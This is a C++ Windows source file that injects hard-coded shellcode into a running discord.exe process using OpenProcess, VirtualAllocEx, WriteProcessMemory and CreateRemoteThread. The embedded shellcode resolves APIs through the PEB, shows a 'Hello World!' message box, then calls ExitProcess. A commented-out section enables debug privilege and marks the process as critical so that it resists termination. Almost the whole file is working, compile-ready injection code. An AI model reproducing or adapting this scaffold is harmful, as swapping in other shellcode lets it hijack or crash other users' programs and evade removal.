#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <iomanip>
#include <Shlwapi.h>
#include <thread>
#pragma comment( lib, "shlwapi.lib")


template <typename ... T>
__forceinline void print_bad(const char* format, T const& ... args)
{
    printf("[!] ");
    printf(format, args ...);

}

template <typename ... T>
__forceinline void print_good(const char* format, T const& ... args)
{
    printf("[+] ");
    printf(format, args ...);
}

/*typedef long(WINAPI* RtlSetProcessIsCritical)(       // turned off because it's not stable
    IN BOOLEAN NewSettings,
    OUT BOOLEAN OldSettings,
    IN BOOLEAN CriticalStop
    );

 BOOL SetPrivilege(BOOL bEnablePrivilege) {                
    HANDLE Proc, hTocken;
    Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (!OpenProcessToken(Proc, TOKEN_ALL_ACCESS, &hTocken)) return false;

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))  return  FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(hTocken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        return FALSE;

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;
    return TRUE;
}
void Skinjbir() {
    RtlSetProcessIsCritical CallAPI;
    CallAPI = (RtlSetProcessIsCritical)GetProcAddress(LoadLibraryA("NTDLL.dll"), "RtlSetProcessIsCritical");

    if (SetPrivilege(TRUE) && CallAPI != NULL) {
        CallAPI(TRUE, FALSE, FALSE);
    }
}

*/ 
DWORD GetPID(const char* pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!_stricmp(pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    print_good("Process found : 0x%lX\n", pE.th32ProcessID);
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

int main(void)
{
    BOOL wp = 0;
    unsigned char ExecBuffer[] =
        "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
        "\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
        "\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
        "\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
        "\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
        "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
        "\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
        "\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
        "\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
        "\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
        "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
        "\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
        "\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
        "\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
        "\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
        "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
        "\x54\x53\xff\xd6\x57\xff\xd0";

    HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPID("discord.exe"));
    if (hw)
    {
        void* base = VirtualAllocEx(hw, NULL, sizeof(ExecBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (base)
        {
            if (WriteProcessMemory(hw, base, ExecBuffer, sizeof(ExecBuffer), NULL))
            {
                HANDLE thread = CreateRemoteThread(hw, NULL, NULL,(LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
                if (thread)
                {
                    print_good("Thread Created Succesfully 0x%lX\n", thread);
                    if (WaitForSingleObject(thread, INFINITE) != 0b11111111111111111111111111111111)
                    {
                        print_good("Thread finished Succesfully 0x%lX\n", thread);
                    }
                    else
                        print_bad("error in WaitForSingleObject 0x%lX\n", GetLastError());
                }
                else
                    print_bad("Failed to create thread (0x%lX)\n", GetLastError());
            }
            else
                print_bad("write process memory faild (0x%lX)\n", GetLastError());
        }
    }
    else
        print_bad("Process Not found (0x%lX)\n", GetLastError());
}
